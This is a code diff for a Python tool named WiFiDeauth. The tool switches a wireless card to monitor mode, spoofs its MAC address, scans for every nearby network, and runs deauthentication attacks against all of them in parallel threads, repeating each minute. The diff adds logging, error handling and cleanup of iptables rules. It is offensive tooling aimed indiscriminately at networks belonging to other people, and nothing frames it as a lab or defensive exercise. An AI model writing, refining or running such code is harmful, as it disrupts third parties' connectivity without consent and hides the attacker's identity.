@@ -14,6 +14,7 @@ class WiFiDeauth:
 
     def set_monitor_mode(self):
         """Sets the interface to monitor mode with a randomized MAC."""
+        print("[LOG] Setting monitor mode and randomizing MAC address.")
         subprocess.check_call(['ifconfig', self.interface, 'down'])
         subprocess.check_call(['iwconfig', self.interface, 'mode', 'monitor'])
         subprocess.check_call(['macchanger', '-m', self.random_mac(), self.interface])
@@ -21,6 +22,7 @@ class WiFiDeauth:
 
     def reset_interface(self):
         """Resets the interface to managed mode and restores the original MAC."""
+        print("[LOG] Resetting interface to managed mode.")
         subprocess.call(['ifconfig', self.interface, 'down'])
         subprocess.call(['macchanger', '-p', self.interface])
         subprocess.call(['iwconfig', self.interface, 'mode', 'managed'])
@@ -31,24 +33,35 @@ class WiFiDeauth:
         print("[LOG] Blocking all incoming packets on the interface.")
         subprocess.call(['iptables', '-A', 'INPUT', '-i', self.interface, '-j', 'DROP'])
 
+    def unblock_all_incoming(self):
+        """Removes the iptables rule that drops incoming packets on the interface."""
+        print("[LOG] Unblocking all incoming packets on the interface.")
+        subprocess.call(['iptables', '-D', 'INPUT', '-i', self.interface, '-j', 'DROP'])
+
     def get_networks(self):
         """Scans and retrieves nearby networks' BSSIDs and ESSIDs."""
-        networks = []
-        scan_output = subprocess.check_output(['iwlist', self.interface, 'scan']).decode()
-        
-        # Parsing iwlist output to get BSSIDs and ESSIDs
-        bssid, essid = None, None
-        for line in scan_output.splitlines():
-            line = line.strip()
-            if "Cell" in line:
-                if bssid and essid:
-                    networks.append((bssid, essid))
-                bssid = line.split("Address: ")[1]
-            elif "ESSID:" in line:
-                essid = line.split("ESSID:")[1].strip('"')
-        if bssid and essid:
-            networks.append((bssid, essid))
-        return networks
+        print("[LOG] Scanning for networks...")
+        try:
+            networks = []
+            scan_output = subprocess.check_output(['iwlist', self.interface, 'scan']).decode()
+
+            # Parsing iwlist output to get BSSIDs and ESSIDs
+            bssid, essid = None, None
+            for line in scan_output.splitlines():
+                line = line.strip()
+                if "Cell" in line:
+                    if bssid and essid:
+                        networks.append((bssid, essid))
+                    bssid = line.split("Address: ")[1]
+                elif "ESSID:" in line:
+                    essid = line.split("ESSID:")[1].strip('"')
+            if bssid and essid:
+                networks.append((bssid, essid))
+            print(f"[LOG] Found {len(networks)} networks.")
+            return networks
+        except subprocess.CalledProcessError as e:
+            print(f"[ERROR] Failed to scan networks: {e}")
+            return []
 
     def deauth_network(self, bssid):
         """Performs a deauthentication attack on the specified BSSID."""
@@ -78,17 +91,21 @@ class WiFiDeauth:
 
         try:
             networks = self.get_networks()
-            print(f"[LOG] Found {len(networks)} networks. Starting deauth attacks...")
+            if not networks:
+                print("[LOG] No networks found. Exiting.")
+                return
+
+            print("[LOG] Starting deauth attacks...")
 
             # Use ThreadPoolExecutor to run deauth attacks in parallel
             with ThreadPoolExecutor(max_workers=len(networks)) as executor:
                 for bssid, essid in networks:
                     print(f"[LOG] Scheduling deauth for {essid} ({bssid})")
                     executor.submit(self.deauth_network, bssid)
-            
+
             print("[LOG] Sleeping for 1 minute before re-running the attack.")
             time.sleep(60)
-        
+
         finally:
             # Remove the iptables block and reset interface after attack
             self.unblock_all_incoming()
